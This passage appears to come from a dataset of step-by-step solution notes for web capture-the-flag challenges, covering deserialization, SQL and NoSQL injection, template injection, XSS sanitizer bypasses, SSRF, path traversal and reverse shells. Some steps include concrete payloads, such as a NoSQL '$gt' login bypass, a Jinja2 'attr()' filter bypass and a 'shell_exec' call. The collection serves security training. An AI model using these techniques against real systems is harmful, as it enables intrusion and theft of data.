    "Identify serialization in the __destruct method.",
    "Use the PHP /// uri.",
    "Deserialize the object of the Image type using PHP.",
    "Identify when __destruct would be called.",
    "Disguise the phar file as a JPEG image.",
    "Upload the disguised phar file.",
    "Create a phar file.",
    "Unserialize the phar file.",
    "Create an Image object with a controlled filename.",
    "Trigger the command './flag_dispenser' when the __destruct method is called.",
    "Trigger the execution of the flag_dispenser command.",
    "Identified vulnerability in /api/image endpoint",
    "Utilized REST to discard png header from uploaded file",
    "Run brute.py script to output arbitrary SQL queries",
    "Identify control over 'request.body.converter'.",
    "Implement '__defineSetter__' on 'converters'.",
    "Create an object that resolves as a promise.",
    "Cause the promise to resolve.",
    "Trigger an error.",
    "Recognized that the 'basename()' function is used in the PHP script",
    "Observed that the 'basename()' function ignores invalid characters",
    "Realized that the invalid characters in the payload can bypass the regex validation",
    "Bypassed strip_tags using the PHP bug.",
    "Flag was in the user agent.",
    "Identify the presence of a create table statement vulnerability.",
    "Determine that the injection is limited to 32 characters.",
    "Find the validation function in the code.",
    "Understand how the SQL statement can transfer results from the select statement into a new table.",
    "Identify the unnecessary parts of the query that need to be wrapped in [] for it to become a valid query.",
    "Apply the necessary adjustments to the injection to ensure it fits within the limitations.",
    "Compile the modified injection query.",
    "Execute the compiled query.",
    "Discover that the tripcode is generated from a snippet of futaba-ng code",
    "Analyze the code snippet",
    "Compare the generated tripcode with the target",
    "Flip one random bit in the wordpress installation",
    "Flip the comparison check in /var/www/html/wp-includes/user.php at position 5389",
    "Modify the comparison to always allow login even with incorrect password",
    "Upload PHP shell",
    "Analyze the PHP script.",
    "Understand that if the IP is from Norway, YAML parses 'NO' as False.",
    "Realize that YAML parsing 'NO' as False allows bypassing escapeshellargs.",
    "Choose the vulnerable points in the script to perform the injection.",
    "Use lesscss to evaluate CSS on the backend.",
    "Leak source code.",
    "Use interp to evaluate Golang at runtime from cookie.",
    "Realize 'os.exec' is blocked.",
    "Use 'os.StartProcess' instead.",
    "Import 'io/ioutil'.",
    "Import 'os'.",
    "Create a function named 'api'.",
    "Define 'os.ProcAttr'.",
    "Assign file descriptors for standard input, output, and error handling.",
    "Execute '/bin/sh' with an argument to read the flag file and redirect the output to '/tmp/jizz'.",
    "Inspect the response from index.jsp.",
    "Pass the decoded cookie to the 'app.render' function",
    "Run arbitrary javascript with the 'outputFunctionName' option",
    "Execute child process for reading the flag file",
    "Bypassed input validation",
    "Injected arbitrary HTML",
    "Identified the challenge as an XPATH injection challenge.",
    "Analyze 'calc.js'",
    "Identify controllable variables in 'calc.js'",
    "Identify ability to control 'astProgram.type' variable",
    "Understand the variable sets the type attribute for the script element",
    "Decide to provide code in the form of JSON object",
    "Realize 'JSON.parse()' will parse the provided code JSON",
    "Decide to switch 'astToJs' to 'evalCode'",
    "Understand this switch allows the execution of custom code within the app",
    "Decide to use Import Maps",
    "Understand using Import Maps will help in switching 'astToJs' to 'evalCode'",
    "Decide to create a new HTML script element",
    "Set 'program' as the id for the new HTML script element",
    "Set 'json' as the language attribute for the new HTML script element",
    "Set 'importmap' as the type attribute for the new HTML script element",
    "Decide to add custom JavaScript code to the 'code' key",
    "Understand this custom JavaScript code will leak the cookie",
    "Decide to execute a Python script (solve.py)",
    "Obtain the flag through the execution of solve.py",
    "Analyze the contents of the 'server.py' file.",
    "Understand the workflow of the Flask web server.",
    "Review the code of the 'query_login_attempt' function.",
    "Exploit the vulnerability in the 'query_login_attempt' function.",
    "Inspect the code of the 'query_kill_time' function.",
    "Checked 'req.files' in check.js.",
    "'next()' was called in each iteration causing express to continue.",
    "Manipulated 'app.post('/upload' to process with invalid 'req.files[req.query.formid]'.",
    "Highlighted 'ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip'.",
    "Combined output filter.",
    "Used 'SetEnv LD_PRELOAD' to execute code when running gzip.",
    "Access and examine the source code of the website.",
    "Identified the condition that only PDF files containing 'ECHO' would be signed.",
    "Identified the 'openssl_verify' function in website source code.",
    "Understood the function is used to sign PDF files.",
    "Applied the retrieved signature to the second PDF.",
    "Notice the presence of a PHP eval function.",
    "Investigate the source code of the website.",
    "Look for any unusual strings.",
    "Notice the mention of `shell_exec` on the website.",
    "Guess that `shell_exec` might be allowed on the website.",
    "Run the command `echo shell_exec(\"../flag\");` on the website.",
    "Page contains some HTML and JavaScript.",
    "Identify a scoped style attribute.",
    "Identify a `navigator.battery.charging call` in the JavaScript.",
    "Deduce that style scoped only works in Firefox versions 21-54.",
    "The challenge entailed shellcoding in the context of PHP to make SQL queries under a sandbox environment.",
    "Identified the presence of a shared object entitled `shellme.so`.",
    "Reviewed the source code.",
    "Determined that sending a GET request with 'source' as a parameter reveals the source code.",
    "Identified from the source code that a POST request with 'shell' as a parameter echoes the input.",
    "Understood that the echoed input is sent to the `shellme()` function with a character limit of 1000.",
    "Determined that the function `shellme()` is defined in the shared object `shellme.so`.",
    "Tracked the function `shellme()` inside the `shellme.so` shared object file.",
    "Found that `shellme()` leads to the function `shell_this()`.",
    "Noticed the use of `SECCOMP_MODE_STRICT` seccomp sandbox.",
    "Determined that it allows only read, write, and exit syscalls before executing the input.",
    "Identified the use of strlen() function within the code.",
    "Realized this would truncate any shellcode at null bytes.",
    "Reviewed the PHP code closely.",
    "Identified that the File Descriptor (FD) for MySQL server connection is open before shellcode execution.",
    "Understood that the server is running php-cgi.",
    "Recognized the necessity to write a php-cgi header before executing the MySQL query.",
    "Constructed the MySQL query ensuring it follows the little-endian, 4 bytes format for length, used 1-byte for query type (0x3 for this specific query), and then added the actual query content.",
    "Utilized the environment to assemble and debug shellcode.",
    "Designed the shellcode.",
    "Employed the JMP - CALL - POP technique within the shellcode to acquire strings in the registers.",
    "Transformed relative JMPs into PLT type trampolines.",
    "This was done to prevent large JMPs containing null bytes.",
    "Introduced NOP Sled to efficiently manage oversized jumps.",
    "Created the shellcode ensuring it has no NULL bytes.",
    "Executed the verified and assembled shellcode.",
    "Take note that the data is sanitized by DOMPurify",
    "Understand that the challenge is to bypass a script inside the iframe",
    "Understand that the script validates the origin and ID of the message",
    "Understand that the script prevents rendering of the body content",
    "Acknowledge that the bypass involves forcing a 'null' origin",
    "Cause the pop-up to inherit the sandboxed attributes",
    "Set the origin as the target URL",
    "Inspect the visible scripts",
    "Explore the source code files",
    "Find the flag in the source code",
    "Use the script on the prepared website",
    "Read the window variable using JavaScript",
    "Identify that the <script>alert('pwned')</script> won't be executed.",
    "Identify that the reason for the script not being executed is the DOMValidator.js script.",
    "Realize that this JS file calculates some sort of document's hash.",
    "Realize that the JS file compares the calculated hash with the original hash.",
    "Note that the page wasn't setting any X-XSS-Protection header.",
    "Note that the XSS-Auditor in Chrome 74 is set to mode=filter.",
    "Note that mode=filter means any reflected XSS will be filtered and not executed.",
    "Realize that the filtering of sha512.js will cause the DOMValidator.js to crash.",
    "Understand that the crash of DOMValidator.js will allow the execution of <script>alert('pwned')</script>.",
    "Inspect the code in the /redirect.",
    "Understand that the potential XSS injection is blocked by the Content-Security-Policy header.",
    "Identify the anchor element that allows for a 'ping' attribute.",
    "Insert code into the /redirect that will change the password of the admin when the admin clicks the URL.",
    "Interpreted a template string",
    "Used Python's format function",
    "Determined that the string {args} returns ImmutableMultiDict([])",
    "Discovered that the goal was to read the 'app.secret_key' value",
    "Used the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py",
    "Found the chain of properties",
    "Used the found object",
    "Accessed the 'app.secret_key' value",
    "In the 'Flask.current_app' module",
    "Include multiple script tags",
    "Expect that one of the nonces will work",
    "Begin using the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"a\"}}",
    "Try the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"z\"}}",
    "Infer that fetching passwords is possible by comparing password characters to the alphabet in the payload",
    "Compare all characters in a possible range.",
    "Identified the challenge as a NoSQL Injection task",
    "Take note of suspect templates in the webpage's code, such as an 'update store description' template.",
    "Recognize the problem could be related to Server-side Template Injection.",
    "Assess the function of the 'handlebars' library within the system.",
    "Continue the investigation by exploring the scope of the Template Injection vulnerability.",
    "Identify a token structure.",
    "Identify how the 'id' in the token is created.",
    "Analyze the structure of the store object.",
    "Recall if there are any properties that are not defined initially but used later.",
    "Locate where 'store.key' is defined using 'crypto.randomBytes'.",
    "Identify when this function is called.",
    "Understand that the crucial check occurs in the 'checkout(req, res)' function that verifies the token's signature matches the key.",
    "Consider ways to apply the Template Injection exploit with the 'setter' and 'getter' properties for 'key'.",
    "Try to access or replace 'store.key' through the Template Injection vulnerability.",
    "Consider redefining the Object prototype if it's necessary.",
    "Find a way around the lack of access to the constructor property.",
    "Consider using older object manipulation features like '__defineSetter__' and '__defineGetter__'.",
    "Override the prototype using a payload to set a context to the prototype of [object].",
    "Redefine 'key' through '__defineSetter__' and '__defineGetter__'.",
    "Verify that the accessor for 'key' has been overridden and behaves as expected.",
    "'name' is a short form of 'window.name' property",
    "Trigger the 'window.open' function with the payload",
    "Set 'window.name' to the long payload",
    "Detect that the JavaScript file 'bundle.js' is used to calculate the hash value.",
    "Analyze the JavaScript bundle to understand how the hash is calculated.",
    "Inspect the injected JavaScript code that is responsible for WebSocket communication.",
    "Validate the encoding function by checking if it produces the same encoded message as captured in unmasked WebSocket packets in Wireshark.",
    "Determine that 'key2' is a shuffled version of 'key'.",
    "Briefly analyze the encoding function to get the basic idea for decoding messages.",
    "Start the decoding process by reversing the function: encoded_arr.split('').map( x => key.indexOf(x) ).reverse().",
    "Continue the decoding process by solving for 'c' in the equation: c = seed, c0 = c + prev_encoded_arr[0] * 256, encoded_arr[0] == c0 % 58.",
    "Use brute force to solve for a set of possible solutions for 'c' and 'prev_encoded_arr[0]'.",
    "Narrow down the solutions by progressing through succeeding elements of 'prev_encoded_arr[]'.",
    "Implement a recursive function to retrieve one character from 'msg' for each WebSocket packet.",
    "Recognized the obfuscation of the JavaScript code",
    "Opened the web-browser's developer tools",
    "Activated the JavaScript debugger",
    "Monitored the execution flow of function calls",
    "Noted the sequence of function calls",
    "Identified a string within the JavaScript scope",
    "Recognized the string as representing the flag",
    "Focus on the 'decrypt.php' file.",
    "Further inspect the contents of 'functions.php' file.",
    "Identify a function that validates the input of a UUID in 'functions.php'.",
    "Understand the correct UUID format and the known prefix.",
    "Include a statement to match the initial UUID sequence.",
    "Restructure the query to generate a SQL query that operates as 'SELECT id LIKE '9e5a%'.",
    "Retrieve the flag from the decrypted image.",
    "Analyze the web application/database setup's behavior.",
    "Develop an SQL payload that determines the length of the intended data ('flag').",
    "Leverage dual hexing technique to transform the flag.",
    "Identify all instances of the 152-digit number.",
    "Assemble the migrated instances of the 152-digit number.",
    "Identify the final flag from the assembled digits.",
    "Notice that the JavaScript code checks if the outcome equals 1337 to give the flag",
    "Note that the code must contain only lowercase letters, parentheses, and periods",
    "Improve the payload further by using different JavaScript functions to reduce the character count",
    "Meet the condition in the JavaScript code by running a payload such that it equals 1337",
    "The code gives flag upon meeting the condition",
    "Attempt to add the attacker's email to the admin's shared note.",
    "Obtained index.php source code from source code.",
    "Gain full control of the $whoareyou variable.",
    "Hijack the $whoareyou variable.",
    "Managed to control $whoareyou variable.",
    "Abused the type attribute.",
    "Created a reverse shell script using only non-alpha chars.",
    "Ran the shell script by visiting the URL 'http://138.68.228.12/alien_message/super_secret_shell.php?_=system&__=rgrep MeePwn /var/www/'.",
    "Discover that Apache2 is restrictive towards parsing the HTTP request.",
    "Find information on Angular's secondary segments in paths.",
    "Investigate Angular's source code.",
    "Discover a 'primary' segment in Angular.",
    "Used %-decodes strings to match the '/debug/answer' endpoint.",
    "Performed a simple curl request to '/\\%64ebug/answer'.",
    "Determined the challenge requires bypassing an Angular application setup behind an Nginx reverse proxy.",
    "Recognized first flag hidden in angular endpoint /debug/answer restricted by Nginx and application.",
    "Recognized second flag hidden in express endpoint /api/true-answer accessible only from localhost.",
    "Analyzed server-side JavaScript handling requests to '/api/true-answer'.",
    "Realized the IP address couldn't be overridden as a result.",
    "Understood this was done server-side.",
    "Identified 'this.service.getAnswer()' command in the Angular application.",
    "Understood it led to 'this.http.get('/api/answer')'.",
    "Identified the application was protected by DOMPurify in version 2.0.16.",
    "Learned of an existing bypass in Chrome for the version of DOMPurify the application was using.",
    "Abused strange behaviors of `<math>` elements.",
    "Attempted to mutate the element in order to bypass the sanitizer.",
    "Ran a JavaScript snippet to test different elements for vulnerabilities with the DOMPurify sanitizer.",
    "Tested different elements for vulnerabilities with the `<math>` element bypass.",
    "Identified a mutation with the `<table>` element.",
    "Realized the application was simulating a Brainf*ck decompiler.",
    "Discovered `<` and `>` characters were protected using a `replaceAll` function.",
    "Understood that the `writeOutput` function could potentially be invoked while the program was still running.",
    "Realized this could lead to unreplaced `<` and `>` characters.",
    "Recognized that the condition for this to occur was the function not being called.",
    "Used DOM Clobbering to bypass the `CONFIG.unsafeRender` check.",
    "Manipulated the `statusCode` using the injected buttons.",
    "Implemented a trick to bypass `innerText` resetting the prepared CONFIG clobbering in the payload.",
    "Study the provided Python script.",
    "Identify that the program attempts to validate IP addresses.",
    "Identify that the program checks if IP matches certain values to confirm it's a valid non-private IP.",
    "Note the condition within the 'admin_status' function.",
    "Identify that the condition only returns the flag if the request is coming from a '127.0.0.1' IP address.",
    "Recognize that the 'valid_ip' function restricts usage of certain IP addresses.",
    "Identify the possibility of representing the localhost (127.0.0.1) in a different notation.",
    "Identify the restrictions set in the 'valid_ip' function.",
    "Identify that representing the localhost (127.0.0.1) in a different notation can bypass the restrictions.",
    "Understand the provided code.",
    "Check if the IP is a private IP using the ipaddress library.",
    "Observe the code structure.",
    "Identify that input sanitization is only implemented on the front end via JavaScript.",
    "Search for 'ip/_ignition/execute-solution' in the Laravel panel",
    "Visit the GitHub exploit page 'https://github.com/ambionics/phpggc'",
    "Visit the GitHub exploit page 'https://github.com/ambionics/laravel-exploits'",
    "Create a phar file",
    "Use the custom command from 'phpggc' repo",
    "Explore the file /static/js/main.",
    "Look into static/css/main.css.",
    "Find the file js.main.",
    "Recognize the potential involvement of code str_replace in changing language.",
    "Recognize a possible chance to test Local File Inclusion (LFI).",
    "Identify that developers may have used blacklisting to prevent path traversal.",
    "Recognize the replacement of certain string patterns as a blacklisting mechanism.",
    "Recognize the use of repeated directory traversal sequences in payload modification.",
    "Access the source code of the web app.",
    "Analyze the 'entrypoint.sh' bash file.",
    "Investigate potential for NoSQL injection due to use of MongoDB.",
    "Progressively brute-force characters.",
    "Develop a Python script to automate the brute-forcing of characters.",
    "Run the script.",
    "Analyze the given files.",
    "Identify it as a Python environment.",
    "Identify the usage of the Python Pillow library.",
    "Notice the usage of a vulnerable version of the Python Pillow library.",
    "Gain insights from the related pull request.",
    "Locate the usage of 'eval' in util.py.",
    "Recognize that RGB parameters can be manipulated in the uploaded image.",
    "Examined the application.",
    "Identified the need to adjust the payload for 'nunjucks'.",
    "Adjusted line 1 and 3 of the payload to work with 'nunjucks'.",
    "Check the docker configuration file.",
    "Determine that the website is a Flask application.",
    "Review the database.py file.",
    "Analyzed the Docker file.",
    "Discovered a hint.",
    "Suggested that the 'shell_exec' function is running.",
    "Clarified that the 'shell_exec' function executes a command in a shell and returns the output.",
    "Identified a potential vulnerability.",
    "Noted that the 'shell_exec' function may be unsanitized.",
    "Suggested that unsanitized 'shell_exec' function allows for potential shell command exploits.",
    "Attempted to escape the 'shell_exec' function.",
    "Attempted to run shell commands.",
    "Read the flag.",
    "Checked the login page source code.",
    "Realized application is running Flask with MySQL.",
    "Looked into database.py.",
    "Checked routes.py file.",
    "Identified application logic.",
    "Identified missing file escape for characters on the filename.",
    "Generate an introspection query for graphql.",
    "Identify a 'Mutation' query in the graphql schema.",
    "Analyze the content of the script.js file.",
    "Identify the code that checks for a 4 digit pin.",
    "Observe the code fetching the flag based on the pin value.",
    "Examine the service.",
    "Confirm that the login page does not contain any JavaScript code.",
    "Observe that a status 500 is received.",
    "Compare the syntax differences between the observed behavior and other database systems.",
    "Deduce that it is MySQL.",
    "Bruteforce the flag character by character.",
    "Use the SUBSTRING and SLEEP functions for each character.",
    "Explain the syntax and usage of the SUBSTRING function.",
    "Explain the syntax and usage of the IF function.",
    "If a correct character is found (indicated by a read timeout), append the character to the flag and move to the next character.",
    "Reveal the hidden sheet",
    "Analyze the server code files.",
    "Focus on app.js.",
    "Configure a grep match for 'flag{' to locate the start of the flag.",
    "Obtain the final flag: 'flag{y4m_y4m_c00k13s}'.",
    "Open the server.py file.",
    "Noticed that error messages are displayed in a javascript alert",
    "Inspected the page source and found no abnormalities",
    "Analyzed the error message and deduced that a Python Flask backend is used",
    "Attempted to remove the 'password' key from the JSON body",
    "Examined the 'if' condition that appears to determine the login logic",
    "Observed the comparison between the calculated hash and the 'hash' value",
    "Realized that these values are used for the calculation and comparison",
    "Developed a Python script to retrieve the flag",
    "Try a bypass method by uploading HTML files disguised as image files.",
    "Realize that HTML files don't execute on the server side.",
    "Switch strategy and attempt to upload an HTML file containing a simple JavaScript function.",
    "Observe that JavaScript inside the uploaded HTML does execute.",
    "Realize that JavaScript doesn't execute when directly input into the application's fields.",
    "Craft a JavaScript snippet that sends a GET request to the '/profile/follow' endpoint.",
    "Embed the crafted JS snippet into an HTML file.",
    "Execute the JS script silently when admin opens the page.",
    "Use Apache httpd 2.4.49 to handle the connection.",
    "Discovered the flag.",
    "Identify JavaScript variable storing user details.",
    "Fail to recognize the potential for using an SQL injection into the password field as an authentication bypass",
    "Double decoded the user cookie",
    "Identified the task as a PHP Object Injection challenge",
    "Tried to become admin, but the server sent hints or funny responses",
    "Manipulated the 'profile_img' attribute in the PHP object",
    "Final payload was a modified PHP object with the 'profile_img' attribute pointing to the flag",
    "Enclose 'ls' command in backticks.",
    "Execute the 'cat index.php' command.",
    "View the code of 'index.php' file.",
    "Identify blacklisted characters mentioned in the code.",
    "Determine the command length limit of 15 characters from the code.",
    "Attempt to execute the 'cat ../flag.txt' command.",
    "Identified that the system might be susceptible to an XXE (XML External Entity) attack.",
    "The identification was based on the mention of XML.",
    "Inspect the Python file provided in the challenge.",
    "Note the inclusion of regex functionality.",
    "Analyze the Python code.",
    "Note that the code ignores the first letter if it's uppercase.",
    "Establish a pattern based on the previous observation.",
    "View code specifics using the debugging tool.",
    "Ensure understanding of the code.",
    "Identify the '|' operator as potentially useful.",
    "Note that the '|' operator allows for matching of either of two separate regular expressions.",
    "Test the code with 'flag{randomString}'.",
    "Determine suitable regular expressions based on the test.",
    "Create a new regex matching the 'flag{randomString}' pattern.",
    "Use the '|' operator in the created regex.",
    "Replace the initial regex in the Python code.",
    "Use the newly created regex as the replacement.",
    "View the page source.",
    "Identify unique JavaScript with nextExport attribute.",
    "Identify unique JavaScript with autoExport attribute.",
    "Identify unique JavaScript with buildId attribute.",
    "Add a random rocket name to the POST request body.",
    "Scour the page source and Javascript files to locate the token.",
    "Incorporate the token identified in the Javascript files into the POST request.",
    "Run grep command to search for unusual text.",
    "Inspected page source",
    "Modified the given example json file",
    "Create an infinite loop.",
    "Loop through each character.",
    "Set the range of characters to loop through as '0123456789abcdef' (hexadecimal).",
    "Use a flag variable to denote a successful guess.",
    "If a guess was successful, restart the loop to guess the next character.",
    "If a guess was not successful, the full password has been guessed.",
    "Break the infinite loop.",
    "Exit the script.",
    "Launch Python.",
    "Import the 'md5' function from 'hashlib' in Python.",
    "Use the '.lower()' method on the variable to convert the string to lowercase.",
    "Combine the hashed string with the text 'SharifCTF{' and '}' to form the flag.",
    "Investigate the HTML code of the website.",
    "Write a Python script to automate the extraction of hidden fields from the website's HTML.",
    "Create a function 'get_hidden' in the Python script.",
    "Create a function 'get_passwords' that generates all possible combinations of YYYYMM from the years 1900 to 2019 and months from 1 to 13.",
    "Check the source code of the website.",
    "Find CSP settings in the source code.",
    "Identify that the site allows script tags with nonces as external resources.",
    "Recognize the possibility of embedding any code into HTML using GET parameter.",
    "Understand the purpose of the attack is to display an image only when the bot accesses the site.",
    "Discover plan of attack involving creating a new script tag.",
    "Minify the code to be read as XSS.",
    "Begin analysis of the verify() function.",
    "Identify verifyUsername() within the verify() function.",
    "Identify verifyPassword() within the verify() function.",
    "Identify verifyMFA() within the verify() function.",
    "Analyze verifyUsername() and find the simple string comparison indicating the correct username to be 'D0loresH4ze'.",
    "Investigate verifyPassword() and observe the use of bcrypt password verification.",
    "Examine verifyMFA() and observe the check for a 10-digit random number.",
    "Create the expected solution string using object injection.",
    "Open the XML file",
    "Locate the flag component in the XML",
    "Modify the location of the flag component in the XML",
    "Identify a Server-Side Template Injection (SSTI) vulnerability in the password field within the code.",
    "Identify a SQL injection vulnerability in the 'data-server' project.",
    "Execute commands using the SSTI vulnerability to read directory contents.",
    "Write a python script.",
    "Create a script.",
    "Note that the server filters the character '.'.",
    "Perform code analysis",
    "Identify SQL injection vulnerability",
    "Recognize user input concatenation in the SQL query",
    "Add comments to comment out the rest of the query",
    "Execute the function",
    "Print out the corresponding 'likeCookie' value.",
    "Stop the loop.",
    "Execute the script to obtain the CTF flag.",
    "Analyzed the provided PHP code for the application's API request handling.",
    "Found that the user check 'is_admin()' would proceed to handle the 'c2' admin command parameter if true, otherwise would call 'redirect()'.",
    "Identified that 'redirect()' function did not actually terminate the script, but printed HTML output, allowing further code execution.",
    "Discovered that 'export_db' function could be exploited to read file contents if the passcode was correct.",
    "Recognized that file path in 'export_db' function could be manipulated for path traversal.",
    "Performed a POST request to the /api.php endpoint with 'id', 'pw', 'c', 'c2', 'pas', and 'db' parameters, using path traversal to access the flag.",
    "Recognize it is intended for Server Side Request Forgery (SSRF).",
    "Determine the need to use '/home/stypr/readflag' on 'website'.",
    "Discover that 'website' runs 'yarn dev'.",
    "Realize 'yarn dev' runs 'vitepress dev src'.",
    "Analyzed the code of the website",
    "Identified the '/usr/games/cowsay' game",
    "Identified that the game is operated from 'child_process.spawnSync'",
    "Observed the settings endpoint",
    "Identified 'ctx.state.user' as the target of the settings",
    "Realized that the setting name is user-controlled",
    "Realized the potential for prototype pollution",
    "Injected a command that echoes the FLAG environment variable",
    "Identify that the server uses dynamic rendering.",
    "Understand that dynamic rendering renders JavaScript on the server-side before serving web crawlers.",
    "Check the Nginx configuration.",
    "Detect the usage of Prerender to handle the requests.",
    "Construct `exploit.html` file.",
    "Notice the dependency on 'jsonwebtoken' 3.2.2 in the target application.",
    "Examine the application's server code.",
    "Understand the constraints of the language input.",
    "Understand that the constraints are due to a regex check.",
    "The server misconstrues the public key as an HMAC private key due to the vulnerability.",
    "Inspect the provided Nginx configuration for any vulnerabilities",
    "Identify the '/admin' directive in the Nginx configuration that denies all requests",
    "Discover a hidden endpoint '/admin/key' from the server code",
    "Research on whether the HTTP headers can manipulate the processing of URL path by Gunicorn",
    "Find out that the 'SCRIPT_NAME' WSGI variable can strip its prefix from 'PATH_INFO'",
    "Use the site's JavaScript to generate the 'key_id'",
    "Modify the '/decrypt' endpoint to decrypt the file using the found decryption key",
    "Find out the flag",
    "Note the presence of certain blacklisted words as restriction",
    "Determine a method to bypass Jinja2 SSTI filters",
    "Access the GET request arguments through `request.args`",
    "Use `attr()` Jinja2 filter to pass blacklisted characters",
    "Apply `attr()` filter with payload `/submit?value={{()|attr(request.args.c)}}&c=__class__`",
    "Evaluate the object attribute and display it to the user",
    "Use the method `().__class__.__base__.__subclasses__()`",
    "Retrieve subclasses of the base class",
    "Use a Python script to find `<class 'subprocess.Popen'>` in the subclasses",
    "Access the index 258",
    "Leverage `subprocess.Popen` for Remote Code Execution (RCE)",
    "Execute 'ls' command on the server using `subprocess.Popen`",
    "Analyze the resulting SQL query.",
    "Access the front-end JavaScript source code.",
    "Inspect the front-end JavaScript source code.",
    "Identify that Meteor is being used.",
    "Observe the 'notes.count' function.",
    "Understand the purpose of 'notes.count'.",
    "Deduce the purpose of the '$ne' filter.",
    "Understand the purpose of '$regex'.",
    "Understand that '$regex' allows regex patterns for note contents.",
    "Concatenate possible characters to the end of the flag.",
    "Check if the possible character is part of the flag.",
    "Verify if the count returns 1.",
    "Output the character if it returns a count larger than 0.",
    "Analyze the code.",
    "Understand the behavior of the code.",
    "Identify potential vulnerabilities.",
    "Recognize the purpose of normalization: prevent directory traversal attacks.",
    "Discover the use of the 'os.system()' method.",
    "Identify use of the 'tar' command when downloading files.",
    "Identify the '--checkpoint-action' option that executes a program at a checkpoint.",
    "Understand that the program is executed when 10 records are reached by default.",
    "Understand the need to overcome file extension restrictions.",
    "Create the file '--checkpoint=1'.",
    "Recognize that '--checkpoint=1' does not pass the file extension check.",
    "Recognize that it passes the extension check due to .txt extension.",
    "Repeat the loop until the total size exceeds 10 records.",
    "Execution of the tar command with wildcard arguments causes the payload in 'shell.txt' to be executed.",
    "Successfully obtain a reverse shell.",
    "Read the Apache configuration file.",
    "Read the Python source code for the web app.",
    "Find faulty secret key handling in the Python source code.",
    "App was composed of frontend and payment backend.",
    "'request.args.get('amount')' was added to the user balance.",
    "Identified possibility to use 'Parameter Pollution' by having two 'amount' arguments.",
    "Username and signup date were passed into the SQL query.",
    "No sanitization was applied.",
    "Created a custom SQLMap tamper script.",
    "Ran SQLMap with the script.",
    "Experimented with `1' ORDER BY` commands.",
    "Determined that SELECT and UNION keywords were being filtered by regex.",
    "Attempted to uncover stored procedures and functions using `1'; SHOW PROCEDURE STATUS; SHOW FUNCTION STATUS;`.",
    "Levied MariaDB's support for the 'EXECUTE IMMEDIATE' command to run queries as strings.",
    "Used backticks around the numeric table name.",
    "Identified that the binary calls the 'id' command three times, with privileges",
    "Identified that the binary calls the 'id' command three times, without privileges",
    "Recognized the need to manipulate the PATH variable to execute arbitrary code when 'id' is called",
    "Recognized the need to manipulate the PATH variable due to the SUID flag being set",
    "Created a bash script",
    "Translated the bash script into a one-liner",
    "Created an 'id' file with the malicious payload",
    "Ensured the shell would execute the malicious 'id'",
    "Identify '/cmd.php' endpoint.",
    "Observe the existence of a blacklist filter.",
    "Execute 'cat cmd.php' command.",
    "View the code of 'cmd.php'.",
    "Observe the presence of the blacklist filter in the code.",
    "Examine the blacklist filter code.",
    "Identify the replacement of blacklisted characters.",
    "Identify the replacement of blacklisted commands.",
    "Identify the use of base64-encoded payloads.",
    "Construct a command.",
    "Include the base64-encoded payload in the command.",
    "Encode the payload using Python on the server.",
    "Create a JavaScript script within the HTML page.",
    "Open a window.",
    "Guess a number based on the window's history length.",
    "Implemented haversine formula",
    "Started analysing how the web application processes Markdown",
    "Sanitized HTML is added to document.body.innerHTML",
    "When the admin's hash is used, the /api/create handler does not sanitize data",
    "fromCharCode() is utilized to avoid escaping quotes",
    "Examine the init() function of the website.",
    "Identify that the init() function changes the displayed note's innerHTML to the /get response on load.",
    "Examine the /get endpoint.",
    "Examine the /add endpoint.",
    "Realize that although XSS can be performed, it would only affect the currently logged in user and not the admin.",
    "Examine the /find endpoint.",
    "Use JavaScript code using `document.cookie` to control variables in the payload.",
    "Generate URLs that set cookies with parts of manipulated JavaScript code.",
    "Modify the output of the Python code.",
    "Format the output of the Python code to look like a JavaScript script.",
    "The malicious JavaScript code is executed on the client's side.",
    "The malicious code fetches an exploitative script.",
    "The exploitative script is run in the background.",
    "Verify the server code location from the provided Dockerfile as '/code/app.py'.",
    "Review the server code.",
    "Observe that 'Requests_On_Steroids' function in 'main.py' supports Gopher protocol.",
    "Identify the 'GopherAdapter' code in 'modules/Gophers.py'.",
    "Find that the Gopher adapter used was modified from a GitHub gist.",
    "Realize the inability to send multi-line input using RESP protocol.",
    "Recognize that 'urllib.parse' was updated to strip newline characters.",
    "Send the command 'SET <userID>_isAdmin \"yes\"'.",
    "Recognize the presence of a Local File Inclusion vulnerability on '/post.php'.",
    "Make a decision to achieve remote code execution.",
    "Recognize that the set input reflects in the included PHP code.",
    "Analyzed the initial JavaScript code.",
    "Identified a line of code where user input is passed unfiltered.",
    "Injected a UNION query.",
    "Ran a final UNION query.",
    "Inserted a series of directory traversal characters (/%2e%2e/%2e%2e) in the request to access server root directories",
    "View the page source",
    "Identify the 'role' attribute",
    "Analyzed the provided PHP source code.",
    "Identified vulnerabilities in the PHP source code.",
    "Noted that most common PHP file extensions are blocked.",
    "Observed that .htaccess extension is allowed.",
    "Created a .htaccess file.",
    "Modified .htaccess to interpret .php16 as PHP.",
    "Uploaded the .htaccess file.",
    "Created a .php16 file.",
    "Used the remote code execution.",
    "Identify the challenge as a Server Side Request Forgery (SSRF) issue.",
    "Determine the vulnerable parameter as 'galleryUrl'.",
    "Analyze the source codes provided.",
    "Write an exploit script that creates an object with properties : 'username', 'password', '_correctValue' and 'mfa'. 'username' and 'password' are provided. '_correctValue' is set to NULL and 'mfa' is assigned the address of '_correctValue'. This ensures that 'mfa' and '_correctValue' are always identical.",
    "Discover that the app uses curl for certain inputs.",
    "Spaces aren't allowed.",
    "Understand that the API is powered by Werkzeug.",
    "Find the secret key for the debugger.",
    "Identify that the secret key is hardcoded in the JavaScript.",
    "Diverge the template at a certain point to create two different PDFs.",
    "Use the 'mutool clean' command to adjust the offsets in the PDF.",
    "Investigate the source code provided.",
    "Understand how the application works and what needs to be exploited.",
    "Find the cookie name that matches the signature.",
    "Run the script.",
    "Estimated the SQL query structure in the website's backend, taking into consideration the potential manipulation of the 'moneys=' parameter.",
    "Reveal source code for index.php",
    "Find a reference to authentication.php in the index.php code",
    "View the source code of authentication.php",
    "Reveal a 'require_once()' function call",
    "Include the cookie.php file",
    "View the source code of cookie.php",
    "Identify a potential PHP deserialization vulnerability in cookie.php",
    "$_COOKIE['login'] is deserialized",
    "Find the 'access_log' class in authentication.php",
    "The 'access_log' class has a '__toString()' function",
    "Understand the possibility of retrieving the flag by crafting and serializing a custom 'access_log' object",
    "Construct a custom PHP script",
    "Create and serialize an 'access_log' object",
    "Set the log_file of the 'access_log' object to '../flag'",
    "The 'access_log' class is defined in /authentication.php",
